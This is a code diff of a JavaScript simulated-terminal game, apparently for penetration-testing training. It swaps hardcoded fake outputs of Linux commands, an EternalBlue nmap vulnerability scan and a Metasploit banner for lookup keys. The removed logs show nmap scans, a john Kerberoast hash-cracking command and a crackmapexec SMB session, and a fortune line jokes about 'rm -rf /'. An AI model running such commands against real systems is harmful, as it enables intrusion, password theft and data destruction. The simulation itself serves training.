-    ],
+    linesKey: 'lsblk',
+    lines: [],
   },
 
   // ── lspci ─────────────────────────────────────────────────────────────────
   {
     match: c => /^lspci(\s|$)/.test(c),
-    lines: [
-      { t: '00:00.0 Host bridge: Intel Corporation 440BX/ZX/DX - 82443BX/ZX/DX Host bridge (rev 01)' },
-      { t: '00:01.0 PCI bridge: Intel Corporation 440BX/ZX/DX - 82443BX/ZX/DX AGP bridge (rev 01)' },
-      { t: '00:07.0 ISA bridge: Intel Corporation 82371AB/EB/MB PIIX4 ISA (rev 08)' },
-      { t: '00:07.1 IDE interface: Intel Corporation 82371AB/EB/MB PIIX4 IDE (rev 01)' },
-      { t: '00:07.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 08)' },
-      { t: '00:07.7 System peripheral: VMware Virtual Machine Communication Interface (rev 10)' },
-      { t: '00:0f.0 VGA compatible controller: VMware SVGA II Adapter', cls: 'g' },
-      { t: '00:10.0 SCSI storage controller: Broadcom / LSI 53c1030 PCI-X Fusion-MPT Dual Ultra320 SCSI' },
-      { t: '00:11.0 PCI bridge: VMware PCI bridge (rev 02)' },
-      { t: '00:15.0 PCI bridge: VMware PCI Express Root Port (rev 01)' },
-      { t: '02:00.0 USB controller: VMware USB2 EHCI Controller', cls: 'b' },
-      { t: '02:01.0 Ethernet controller: VMware VMXNET3 Ethernet Controller (rev 01)', cls: 'g' },
-      { t: '02:02.0 Multimedia audio controller: Ensoniq ES1371/ES1373 / Creative Labs CT2518 (rev 02)' },
-      { t: '02:03.0 SATA controller: VMware SATA AHCI controller', cls: 'b' },
-    ],
+    linesKey: 'lspci',
+    lines: [],
   },
 
   // ── lsusb ─────────────────────────────────────────────────────────────────
   {
     match: c => /^lsusb(\s|$)/.test(c),
-    lines: [
-      { t: 'Bus 001 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub', cls: 'b' },
-      { t: 'Bus 001 Device 002: ID 0e0f:0003 VMware, Inc. Virtual Mouse' },
-      { t: 'Bus 001 Device 003: ID 0e0f:0002 VMware, Inc. Virtual Keyboard' },
-      { t: 'Bus 002 Device 001: ID 1d6b:0001 Linux Foundation 1.1 root hub', cls: 'b' },
-      { t: 'Bus 002 Device 002: ID 0e0f:0008 VMware, Inc. VMware Virtual USB Hub' },
-    ],
+    linesKey: 'lsusb',
+    lines: [],
   },
 
   // ── hostnamectl ───────────────────────────────────────────────────────────
@@ -1854,67 +1562,15 @@ const HANDLERS = [
   {
     match: c => /^dmidecode(\s|$)/.test(c),
     requireRoot: true,
-    lines: [
-      { t: '# dmidecode 3.5', cls: 'd' },
-      { t: 'Getting SMBIOS data from sysfs.' },
-      { t: 'SMBIOS 2.7 present.' },
-      { t: '' },
-      { t: 'Handle 0x0001, DMI type 1, 27 bytes', cls: 'b' },
-      { t: 'System Information' },
-      { t: '\tManufacturer: VMware, Inc.' },
-      { t: '\tProduct Name: VMware Virtual Platform' },
-      { t: '\tVersion: None' },
-      { t: '\tSerial Number: VMware-56 4d 2f 8a b2 c1 3d e4-89 f0 12 34 56 78 9a bc' },
-      { t: '\tUUID: 564d2f8a-b2c1-3de4-89f0-123456789abc' },
-      { t: '\tWake-up Type: Power Switch' },
-      { t: '' },
-      { t: 'Handle 0x0002, DMI type 2, 15 bytes', cls: 'b' },
-      { t: 'Base Board Information' },
-      { t: '\tManufacturer: Intel Corporation' },
-      { t: '\tProduct Name: 440BX Desktop Reference Platform' },
-      { t: '\tVersion: None' },
-      { t: '' },
-      { t: 'Handle 0x0004, DMI type 4, 48 bytes', cls: 'b' },
-      { t: 'Processor Information' },
-      { t: '\tSocket Designation: CPU socket #0' },
-      { t: '\tType: Central Processor' },
-      { t: '\tFamily: Xeon' },
-      { t: '\tManufacturer: GenuineIntel' },
-      { t: '\tID: EA 06 00 00 FF FB EB BF' },
-      { t: '\tVersion: Intel(R) Core(TM) i7-10700K CPU @ 3.80GHz' },
-      { t: '\tVoltage: 3.3 V' },
-      { t: '\tExternal Clock: 100 MHz' },
-      { t: '\tMax Speed: 3800 MHz' },
-      { t: '\tCurrent Speed: 3800 MHz' },
-      { t: '\tStatus: Populated, Enabled' },
-      { t: '\tCore Count: 4' },
-      { t: '\tThread Count: 8' },
-      { t: '' },
-      { t: 'Handle 0x0017, DMI type 17, 92 bytes', cls: 'b' },
-      { t: 'Memory Device' },
-      { t: '\tArray Handle: 0x0016' },
-      { t: '\tTotal Width: 64 bits' },
-      { t: '\tData Width: 64 bits' },
-      { t: '\tSize: 8 GB' },
-      { t: '\tForm Factor: DIMM' },
-      { t: '\tLocator: DIMM 0' },
-      { t: '\tType: RAM' },
-      { t: '\tSpeed: 3200 MT/s' },
-      { t: '\tManufacturer: Kingston' },
-      { t: '\tSerial Number: 00000001' },
-      { t: '\tPart Number: KHX3200C16D4/8GX' },
-      { t: '\tConfigured Memory Speed: 3200 MT/s' },
-    ],
+    linesKey: 'dmidecode',
+    lines: [],
   },
 
   // ── vmstat ────────────────────────────────────────────────────────────────
   {
     match: c => /^vmstat(\s|$)/.test(c),
-    lines: [
-      { t: 'procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu-----', cls: 'b' },
-      { t: ' r  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa st' },
-      { t: ' 1  0      0 4325632 213456  935472    0    0     1     4  167  423  2  1 97  0  0', cls: 'g' },
-    ],
+    linesKey: 'vmstat',
+    lines: [],
   },
 
   // ── iostat ────────────────────────────────────────────────────────────────
@@ -1960,137 +1616,45 @@ const HANDLERS = [
   // ── lsmod ─────────────────────────────────────────────────────────────────
   {
     match: c => c === 'lsmod',
-    lines: [
-      { t: 'Module                  Size  Used by', cls: 'b' },
-      { t: 'nf_nat                 57344  3 nft_nat,xt_nat,nf_nat_masquerade_ipv4' },
-      { t: 'nf_conntrack          180224  6 nf_nat,nft_ct,xt_conntrack,nf_nat_masquerade_ipv4,nf_conntrack_netlink,xt_MASQUERADE' },
-      { t: 'nft_compat             20480  34' },
-      { t: 'nf_tables             299008  438 nft_compat,nft_ct,nft_nat' },
-      { t: 'vmw_vsock_vmci_transport    32768  0' },
-      { t: 'vmw_vmci               77824  1 vmw_vsock_vmci_transport' },
-      { t: 'vmwgfx                393216  2', cls: 'b' },
-      { t: 'drm_ttm_helper         16384  1 vmwgfx' },
-      { t: 'ttm                    77824  2 vmwgfx,drm_ttm_helper' },
-      { t: 'drm_kms_helper        221184  1 vmwgfx' },
-      { t: 'e1000                 155648  0', cls: 'g' },
-      { t: 'vmxnet3                73728  0', cls: 'g' },
-      { t: 'ata_piix               32768  2' },
-      { t: 'libata                266240  2 ata_piix,ahci' },
-      { t: 'scsi_mod              266240  4 libata,sd_mod,scsi_transport_spi,mptspi' },
-    ],
+    linesKey: 'lsmod',
+    lines: [],
   },
 
   // ── dmesg ────────────────────────────────────────────────────────────────
   {
     match: c => /^dmesg(\s|$)/.test(c),
-    lines: [
-      { t: '[    0.000000] Linux version 6.6.9-amd64 (debian-kernel@lists.debian.org) (gcc-13 (Debian 13.2.0-13) 13.2.0, GNU ld (GNU Binutils for Debian) 2.41) #1 SMP PREEMPT_DYNAMIC Rembrandt 6.6.9-1kali1 (2024-01-08)', cls: 'b' },
-      { t: '[    0.000000] Command line: BOOT_IMAGE=/vmlinuz-6.6.9-amd64 root=/dev/sda1 ro quiet splash' },
-      { t: '[    0.000000] BIOS-e820: [mem 0x0000000000000000-0x000000000009efff] usable' },
-      { t: '[    0.000000] BIOS-e820: [mem 0x000000000009f000-0x00000000000fffff] reserved' },
-      { t: '[    0.000000] BIOS-e820: [mem 0x0000000000100000-0x000000003fffffff] usable' },
-      { t: '[    0.000000] NX (Execute Disable) protection: active', cls: 'g' },
-      { t: '[    0.000000] SMBIOS 2.7 present.' },
-      { t: '[    0.000000] DMI: VMware, Inc. VMware Virtual Platform/440BX Desktop Reference Platform, BIOS 6.00 11/12/2020' },
-      { t: '[    0.000000] Hypervisor detected: VMware', cls: 'y' },
-      { t: '[    0.000000] tsc: Detected 3800.000 MHz processor' },
-      { t: '[    0.235718] ACPI: IRQ0 used by override.' },
-      { t: '[    0.246891] PCI: Using configuration type 1 for base access' },
-      { t: '[    0.892314] NET: Registered PF_PACKET protocol family' },
-      { t: '[    0.934521] clocksource: tsc-early: mask: 0xffffffffffffffff max_cycles: 0x36d8e3f9938, max_idle_ns: 881590580619 ns' },
-      { t: '[    1.123456] AppArmor: AppArmor initialized', cls: 'g' },
-      { t: '[    1.234567] audit: type=1400 audit(1705313341.000:2): apparmor="STATUS" operation="profile_load" profile="unconfined" name="nvidia_modprobe"' },
-      { t: '[    1.456789] e1000: Intel(R) PRO/1000 Network Driver', cls: 'b' },
-      { t: '[    1.457891] e1000: Copyright (c) 1999-2006 Intel Corporation.' },
-      { t: '[    1.502341] SCSI subsystem initialized' },
-      { t: '[    1.823456] ata1: SATA max UDMA/133 cmd 0x1f0 ctl 0x3f6 bmdma 0xc000 irq 14', cls: 'b' },
-      { t: '[    2.012345] EXT4-fs (sda1): mounted filesystem with ordered data mode. Quota mode: none.', cls: 'g' },
-      { t: '[    2.134567] NET: Registered PF_INET6 protocol family' },
-      { t: '[    2.456789] Bluetooth: Core ver 2.22' },
-      { t: '[    2.567890] NET: Registered PF_BLUETOOTH protocol family' },
-      { t: '[    3.234567] systemd[1]: systemd 252.22-1~deb12u1 running in system mode', cls: 'g' },
-      { t: '[    3.456789] systemd[1]: Detected virtualization vmware.', cls: 'y' },
-      { t: '[    3.678901] systemd[1]: Detected architecture x86-64.' },
-      { t: '[   12.345678] audit: type=1400 audit(1705313351.000:42): apparmor="STATUS" operation="profile_replace" name="dhclient"' },
-      { t: '[   14.456789] e1000 0000:02:01.0 eth0: renamed from ens33', cls: 'b' },
-    ],
+    linesKey: 'dmesg',
+    lines: [],
   },
 
   // ── journalctl ────────────────────────────────────────────────────────────
   {
     match: c => /^journalctl(\s|$)/.test(c),
-    lines: [
-      { t: '-- Logs begin at Mon 2024-01-15 12:09:01 EST, end at Mon 2024-01-15 14:23:01 EST. --', cls: 'd' },
-      { t: 'Jan 15 12:09:01 rembrandt systemd[1]: Starting Kali GNU/Linux Rolling...', cls: 'b' },
-      { t: 'Jan 15 12:09:02 rembrandt kernel: Linux version 6.6.9-amd64' },
-      { t: 'Jan 15 12:09:02 rembrandt kernel: Command line: BOOT_IMAGE=/vmlinuz-6.6.9-amd64 root=/dev/sda1 ro quiet splash' },
-      { t: 'Jan 15 12:09:03 rembrandt systemd[1]: Starting Network Time Synchronization...' },
-      { t: 'Jan 15 12:09:04 rembrandt systemd[1]: Started Network Time Synchronization.', cls: 'g' },
-      { t: 'Jan 15 12:09:05 rembrandt systemd[1]: Starting Network Service...' },
-      { t: 'Jan 15 12:09:05 rembrandt NetworkManager[432]: <info>  [1705313345.0000] NetworkManager (version 1.44.2) is starting' },
-      { t: 'Jan 15 12:09:06 rembrandt NetworkManager[432]: <info>  [1705313346.0000] Read config: /etc/NetworkManager/NetworkManager.conf' },
-      { t: 'Jan 15 12:09:08 rembrandt NetworkManager[432]: <info>  [1705313348.0000] device (eth0): state change: config -> ip-config (reason \'none\', sys-iface-state: \'managed\')' },
-      { t: 'Jan 15 12:09:10 rembrandt dhclient[612]: DHCPREQUEST for 10.10.10.5 on eth0 to 255.255.255.255 port 67', cls: 'b' },
-      { t: 'Jan 15 12:09:10 rembrandt dhclient[612]: DHCPACK of 10.10.10.5 from 10.10.10.1', cls: 'g' },
-      { t: 'Jan 15 12:09:12 rembrandt sshd[591]: Server listening on 0.0.0.0 port 22.', cls: 'g' },
-      { t: 'Jan 15 12:09:12 rembrandt sshd[591]: Server listening on :: port 22.' },
-      { t: 'Jan 15 12:10:03 rembrandt gdm-launch-environment[811]: pam_unix(gdm-launch-environment:session): session opened for user gdm(uid=115) by (uid=0)' },
-      { t: 'Jan 15 12:10:15 rembrandt sudo[1022]: pam_unix(sudo:auth): authentication failure; logname=rembrandt uid=1000 euid=0 tty=/dev/pts/0 ruser=rembrandt rhost=  user=kali', cls: 'y' },
-      { t: 'Jan 15 12:10:20 rembrandt sudo[1023]:     rembrandt : TTY=pts/0 ; PWD=/home/rembrandt ; USER=root ; COMMAND=/usr/bin/nmap -sn 10.10.10.0/24', cls: 'b' },
-      { t: 'Jan 15 14:18:04 rembrandt sudo[1289]:     rembrandt : TTY=pts/0 ; PWD=/home/rembrandt ; USER=root ; COMMAND=/usr/bin/nmap -sV -sC 10.10.10.10', cls: 'b' },
-      { t: 'Jan 15 14:22:31 rembrandt sudo[1421]:     rembrandt : TTY=pts/0 ; PWD=/home/rembrandt ; USER=root ; COMMAND=/usr/sbin/john hashes.kerberoast --wordlist=/usr/share/wordlists/rockyou.txt', cls: 'b' },
-      { t: '-- No entries -- (use journalctl --no-pager for full output)', cls: 'd' },
-    ],
+    linesKey: 'journalctl',
+    lines: [],
   },
 
   // ── ss — improved with -tulpn support ────────────────────────────────────
   {
     match: c => /^ss\s.*(-t|-u|-l|-p|-n|tulpn|antp)/.test(c) || /^netstat\s.*(-t|-u|-l|-p|-n|tulpn)/.test(c),
-    lines: [
-      { t: 'Netid  State    Recv-Q  Send-Q  Local Address:Port     Peer Address:Port  Process', cls: 'b' },
-      { t: 'tcp    LISTEN   0       128     0.0.0.0:22              0.0.0.0:*          users:(("sshd",pid=591,fd=3))', cls: 'g' },
-      { t: 'tcp    LISTEN   0       128     127.0.0.1:631           0.0.0.0:*          users:(("cupsd",pid=798,fd=7))' },
-      { t: 'tcp    LISTEN   0       5       127.0.0.53%lo:53        0.0.0.0:*          users:(("systemd-resolve",pid=412,fd=13))' },
-      { t: 'tcp    ESTAB    0       0       10.10.10.5:51234        10.10.10.10:445    users:(("crackmapexec",pid=1201,fd=5))', cls: 'y' },
-      { t: 'tcp6   LISTEN   0       128     [::]:22                 [::]:*             users:(("sshd",pid=591,fd=4))' },
-      { t: 'udp    UNCONN   0       0       127.0.0.53%lo:53        0.0.0.0:*          users:(("systemd-resolve",pid=412,fd=12))' },
-      { t: 'udp    UNCONN   0       0       0.0.0.0:68              0.0.0.0:*          users:(("dhclient",pid=612,fd=7))' },
-    ],
+    linesKey: 'ss.tulpn',
+    lines: [],
   },
 
   // ── iptables ──────────────────────────────────────────────────────────────
   {
     match: c => /^iptables(\s|$)/.test(c),
     requireRoot: true,
-    lines: [
-      { t: 'Chain INPUT (policy ACCEPT)', cls: 'g' },
-      { t: 'target     prot opt source               destination' },
-      { t: '' },
-      { t: 'Chain FORWARD (policy DROP)', cls: 'r' },
-      { t: 'target     prot opt source               destination' },
-      { t: '' },
-      { t: 'Chain OUTPUT (policy ACCEPT)', cls: 'g' },
-      { t: 'target     prot opt source               destination' },
-    ],
+    linesKey: 'iptables',
+    lines: [],
   },
 
   // ── nft ───────────────────────────────────────────────────────────────────
   {
     match: c => /^nft(\s|$)/.test(c),
     requireRoot: true,
-    lines: [
-      { t: 'table inet filter {', cls: 'b' },
-      { t: '\tchain input {' },
-      { t: '\t\ttype filter hook input priority filter; policy accept;' },
-      { t: '\t}' },
-      { t: '\tchain forward {' },
-      { t: '\t\ttype filter hook forward priority filter; policy drop;' },
-      { t: '\t}' },
-      { t: '\tchain output {' },
-      { t: '\t\ttype filter hook output priority filter; policy accept;' },
-      { t: '\t}' },
-      { t: '}' },
-    ],
+    linesKey: 'nft',
+    lines: [],
   },
 
   // ── dig / nslookup ────────────────────────────────────────────────────────
@@ -2239,7 +1803,7 @@ const HANDLERS = [
     match: c => /^file\s/.test(c),
     lines: [{ t: (cmd) => {
       const arg = cmd.replace(/^file\s+/, '').trim();
-      if (arg.endsWith('.kerberoast') || arg.endsWith('.txt')) {
+      if (arg.endsWith('.txt')) {
         return `${arg}: ASCII text`;
       }
       if (arg.endsWith('.py')) return `${arg}: Python script, ASCII text executable`;
@@ -2250,7 +1814,7 @@ const HANDLERS = [
       return `${arg}: cannot open \`${arg}' (No such file or directory)`;
     }, cls: (cmd) => {
       const arg = cmd.replace(/^file\s+/, '').trim();
-      return (arg.endsWith('.txt') || arg.endsWith('.kerberoast') || arg.startsWith('/usr/bin/')) ? 'g' : 'r';
+      return (arg.endsWith('.txt') || arg.startsWith('/usr/bin/')) ? 'g' : 'r';
     }}],
   },
 
@@ -2260,7 +1824,6 @@ const HANDLERS = [
     lines: [{ t: (cmd) => {
       const arg = cmd.replace(/^wc\s*/, '').trim();
       if (arg.includes('rockyou')) return '14344392  14344392 139921507 /usr/share/wordlists/rockyou.txt';
-      if (arg.includes('.kerberoast')) return '      3       3    3241 hashes.kerberoast';
       if (arg.includes('notes')) return '      5      22     248 notes.txt';
       if (arg.includes('-l')) {
         if (arg.includes('rockyou')) return '14344392 /usr/share/wordlists/rockyou.txt';
@@ -2278,7 +1841,6 @@ const HANDLERS = [
       const nMatch = cmd.match(/-n\s*(\d+)/);
       const n = nMatch ? parseInt(nMatch[1]) : 10;
       const files = { ...SIM.files };
-      if (SIM.hashesOnDisk) files['/home/' + SIM.user + '/hashes.kerberoast'] = KRB5_HASHES;
       const abs = arg.startsWith('/') ? arg : SIM.cwd.replace(/\/?$/,'/') + arg;
       const content = files[abs] || files['/home/' + SIM.user + '/' + arg];
       if (content) return content.split('\n').slice(0, n).join('\n');
@@ -2287,7 +1849,6 @@ const HANDLERS = [
       const arg = cmd.replace(/^head\s+(-n\s*\d+\s+)?/, '').trim();
       const abs = arg.startsWith('/') ? arg : SIM.cwd.replace(/\/?$/,'/') + arg;
       const files = { ...SIM.files };
-      if (SIM.hashesOnDisk) files['/home/' + SIM.user + '/hashes.kerberoast'] = KRB5_HASHES;
       return (files[abs] || files['/home/' + SIM.user + '/' + arg]) ? '' : 'r';
     }}],
   },
@@ -2300,7 +1861,6 @@ const HANDLERS = [
       const nMatch = cmd.match(/-n\s*(\d+)/);
       const n = nMatch ? parseInt(nMatch[1]) : 10;
       const files = { ...SIM.files };
-      if (SIM.hashesOnDisk) files['/home/' + SIM.user + '/hashes.kerberoast'] = KRB5_HASHES;
       const abs = arg.startsWith('/') ? arg : SIM.cwd.replace(/\/?$/,'/') + arg;
       const content = files[abs] || files['/home/' + SIM.user + '/' + arg];
       if (content) {
@@ -2319,14 +1879,14 @@ const HANDLERS = [
       const tool = cmd.split(' ')[0];
       const arg  = cmd.replace(/^\S+\s+/, '').trim();
       const hashes = {
-        'md5sum':    { 'notes.txt':'4b24ff9a7bea58d05f3b7a8ce35e1230', 'hashes.kerberoast':'9f3a8b2c1d4e5f6a7b8c9d0e1f2a3b4c' },
-        'sha1sum':   { 'notes.txt':'a3f8d2c1b4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9', 'hashes.kerberoast':'1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b' },
-        'sha256sum': { 'notes.txt':'a3f8d2c1b4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1', 'hashes.kerberoast':'b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6' },
-        'sha512sum': { 'notes.txt':'a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4', 'hashes.kerberoast':'b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3' },
+        'md5sum':    { 'notes.txt':'4b24ff9a7bea58d05f3b7a8ce35e1230' },
+        'sha1sum':   { 'notes.txt':'a3f8d2c1b4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9' },
+        'sha256sum': { 'notes.txt':'a3f8d2c1b4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1' },
+        'sha512sum': { 'notes.txt':'a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4' },
       };
       const name = arg.split('/').pop();
       const h = hashes[tool]?.[name] || Array.from({length: tool === 'sha512sum' ? 128 : tool === 'sha256sum' ? 64 : tool === 'sha1sum' ? 40 : 32}, () => '0123456789abcdef'[Math.floor(Math.random()*16)]).join('');
-      const exists = SIM.files['/home/' + SIM.user + '/' + name] || SIM.files['/root/'+name] || name === 'hashes.kerberoast';
+      const exists = SIM.files['/home/' + SIM.user + '/' + name] || SIM.files['/root/'+name];
       if (!exists) return `${tool}: ${arg}: No such file or directory`;
       return `${h}  ${arg}`;
     }, cls: 'g'}],
@@ -2766,17 +2326,8 @@ const HANDLERS = [
   // ── mount ────────────────────────────────────────────────────────────────
   {
     match: c => c === 'mount' || /^mount\s+-l/.test(c),
-    lines: [
-      { t: 'sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)' },
-      { t: 'proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)' },
-      { t: 'devtmpfs on /dev type devtmpfs (rw,nosuid,size=4096k,nr_inodes=4096,mode=755)' },
-      { t: '/dev/sda1 on / type ext4 (rw,relatime,errors=remount-ro)', cls: 'g' },
-      { t: 'tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)' },
-      { t: 'tmpfs on /run type tmpfs (rw,nosuid,nodev,noexec,relatime,size=1630892k,mode=755)' },
-      { t: '/dev/sda2 on /home type ext4 (rw,relatime)', cls: 'g' },
-      { t: 'tmpfs on /tmp type tmpfs (rw,nosuid,nodev)' },
-      { t: 'tmpfs on /run/user/1000 type tmpfs (rw,nosuid,nodev,relatime,size=1630888k,nr_inodes=407722,mode=700,uid=1000,gid=1000)' },
-    ],
+    linesKey: 'mount',
+    lines: [],
   },
 
   // ── neofetch ─────────────────────────────────────────────────────────────────
@@ -2836,7 +2387,6 @@ const HANDLERS = [
         'The only truly secure system is one that is powered off, cast in a block of concrete and sealed in a lead-lined room with armed guards.\n\t-- Gene Spafford',
         'Hackers are breaking the systems for profit. Before, it was about intellectual curiosity and pursuit of knowledge and thrill, and now hacking is big business.\n\t-- Kevin Mitnick',
         'There are two types of companies: those that have been hacked, and those who don\'t know they have been hacked.\n\t-- John Chambers',
-        'Kerberoasting: because any domain user can request TGS tickets, and humans pick terrible passwords.',
         'The quieter you become, the more you are able to hear... the LDAP queries.',
         'rm -rf / : because sometimes you need to start over.',
         'There\'s no patch for human stupidity.\n\t-- (unknown)',
@@ -2849,30 +2399,8 @@ const HANDLERS = [
   // ── sl (steam locomotive Easter egg) ─────────────────────────────────────
   {
     match: c => c === 'sl' || c === 'sl -al',
-    lines: [
-      { t: '                      (  ) (@@) ( )  (@)  ()    @@    O     @     O     @      O' },
-      { t: '               (@@@)' },
-      { t: '           (    )' },
-      { t: '        (@@@@)' },
-      { t: '     (   )' },
-      { t: '                   |\\      _,,,---,,_' },
-      { t: "                   /,`.-'`'    -.  ;-;;,_" },
-      { t: '                  |,4-  ) )-,_..;\\ (  `\'-\'' },
-      { t: "                 '---''(_/--'  `-'\\_)" },
-      { t: '' },
-      { t: '   ====        ________                ___________', cls: 'y' },
-      { t: '  _D _|  |_______/        \\__I_I_____===__|_________|', cls: 'y' },
-      { t: '   |(_)---  |   H\\________/ |   |        =|___ ___|', cls: 'y' },
-      { t: '   /     |  |   H  |  |     |   |         ||_| |_||', cls: 'y' },
-      { t: '  |      |  |   H  |__--------------------| [___] |', cls: 'y' },
-      { t: '  | ________|___H__/__|_____/[][]~\\_______|       |', cls: 'y' },
-      { t: '  |/ |   |-----------I_____I [][] []  D   |=======|--', cls: 'y' },
-      { t: '__/ =| o |=-~~\\  /~~\\  /~~\\  /~~\\ ____Y___________|__', cls: 'r' },
-      { t: ' |/-=|___|=   O=====O=====O=====O|_____/~\\___/        ', cls: 'r' },
-      { t: '  \\_/      \\__/  \\__/  \\__/  \\__/      \\_/            ', cls: 'r' },
-      { t: '' },
-      { t: 'sl: command not found — but you found the Easter egg!', cls: 'd' },
-    ],
+    linesKey: 'sl',
+    lines: [],
   },
 
   // ── Windows shell extras ──────────────────────────────────────────────────
@@ -2882,20 +2410,8 @@ const HANDLERS = [
     id: 'nmap-eb-discovery',
     loadTime: () => jitter(2800, 500),
     match: c => /^nmap\b/.test(c) && (c.includes('10.10.20') || c.includes('20.0/24')) && !c.includes('smb-vuln'),
-    lines: [
-      { t: 'Starting Nmap 7.94 ( https://nmap.org )' },
-      { t: '' },
-      { t: 'Nmap scan report for 10.10.20.1', cls: 'b' },
-      { t: 'Host is up (0.00042s latency).' },
-      { t: '' },
-      { t: 'Nmap scan report for 10.10.20.5', cls: 'b' },
-      { t: 'Host is up (0.000071s latency).' },
-      { t: '' },
-      { t: 'Nmap scan report for WIN7-PC (10.10.20.10)', cls: 'g' },
-      { t: 'Host is up (0.0021s latency).' },
-      { t: '' },
-      { t: 'Nmap done: 256 IP addresses (3 hosts up) scanned in 2.61 seconds', cls: 'g' },
-    ],
+    linesKey: 'eternalblue.nmap.discovery',
+    lines: [],
   },
 
   // ── EternalBlue vuln scan ─────────────────────────────────────────────────
@@ -2918,69 +2434,16 @@ const HANDLERS = [
       ];
     },
     match: c => /^nmap\b/.test(c) && c.includes('smb-vuln') && c.includes('10.10.20.10'),
-    lines: [
-      { t: () => 'Starting Nmap 7.94 ( https://nmap.org ) at ' + new Date().toUTCString().slice(0,16) },
-      { t: 'Nmap scan report for WIN7-PC (10.10.20.10)' },
-      { t: 'Host is up (0.0021s latency).' },
-      { t: 'Not shown: 997 closed tcp ports (reset)' },
-      { t: 'PORT      STATE SERVICE            VERSION' },
-      { t: '135/tcp   open  msrpc              Microsoft Windows RPC', cls: 'g' },
-      { t: '139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn', cls: 'g' },
-      { t: '445/tcp   open  microsoft-ds       Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)', cls: 'r' },
-      { t: '3389/tcp  open  ssl/ms-wbt-server  Microsoft Terminal Services', cls: 'y' },
-      { t: '' },
-      { t: 'Host script results:' },
-      { t: '|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s' },
-      { t: '| smb-security-mode:' },
-      { t: '|   account_used: guest' },
-      { t: '|   authentication_level: user' },
-      { t: '|   challenge_response: supported' },
-      { t: '|_  message_signing: disabled (dangerous, but default)', cls: 'r' },
-      { t: '| smb-vuln-ms17-010: ', cls: 'r' },
-      { t: '|   VULNERABLE:', cls: 'r' },
-      { t: '|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)', cls: 'r' },
-      { t: '|     State: VULNERABLE', cls: 'r' },
-      { t: '|     IDs:  CVE:CVE-2017-0143', cls: 'r' },
-      { t: '|     Risk factor: HIGH', cls: 'r' },
-      { t: '|       A critical remote code execution vulnerability exists in Microsoft SMBv1', cls: 'r' },
-      { t: '|       servers (ms17-010).', cls: 'r' },
-      { t: '|     Disclosure date: 2017-03-14', cls: 'd' },
-      { t: '|     References:', cls: 'd' },
-      { t: '|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143', cls: 'd' },
-      { t: '|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx', cls: 'd' },
-      { t: '' },
-      { t: 'Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows' },
-      { t: '' },
-      { t: () => 'Nmap done: 1 IP address (1 host up) scanned in ' + (7.2 + Math.random()).toFixed(2) + ' seconds', cls: 'g' },
-    ],
+    linesKey: 'eternalblue.nmap.vuln',
+    lines: [],
   },
 
   // ── msfconsole ───────────────────────────────────────────────────────────────────────────
   {
     id: 'msfconsole',
     match: c => c === 'msfconsole' || c === 'msfconsole -q',
-    stepLines: [
-      { t: '\x1b[90m[*] Starting the Metasploit Framework console...\x1b[0m', delay: 0 },
-      { t: '\x1b[90m[*] Checking for updates...\x1b[0m', delay: jitter(400, 100) },
-      { t: '\x1b[90m[*] Loading modules...\x1b[0m', delay: jitter(700, 150) },
-      { t: '', delay: jitter(900, 200) },
-      { t: '\x1b[31m  ██████╗ ███████╗███╗   ███╗██████╗ ██████╗  █████╗ ███╗   ██╗██████╗ ████████╗\x1b[0m', delay: 40 },
-      { t: '\x1b[31m  ██╔══██╗██╔════╝████╗ ████║██╔══██╗██╔══██╗██╔══██╗████╗  ██║██╔══██╗╚══██╔══╝\x1b[0m', delay: 40 },
-      { t: '\x1b[31m  ██████╔╝█████╗  ██╔████╔██║██████╔╝██████╔╝███████║██╔██╗ ██║██║  ██║   ██║   \x1b[0m', delay: 40 },
-      { t: '\x1b[31m  ██╔══██╗██╔══╝  ██║╚██╔╝██║██╔══██╗██╔══██╗██╔══██║██║╚██╗██║██║  ██║   ██║   \x1b[0m', delay: 40 },
-      { t: '\x1b[31m  ██║  ██║███████╗██║ ╚═╝ ██║██████╔╝██║  ██║██║  ██║██║ ╚████║██████╔╝   ██║   \x1b[0m', delay: 40 },
-      { t: '\x1b[31m  ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝    ╚═╝   \x1b[0m', delay: 40 },
-      { t: '', delay: 100 },
-      { t: '\x1b[90m       Exploitation Framework \u2014 because patching is optional, apparently\x1b[0m', delay: 200 },
-      { t: '', delay: 80 },
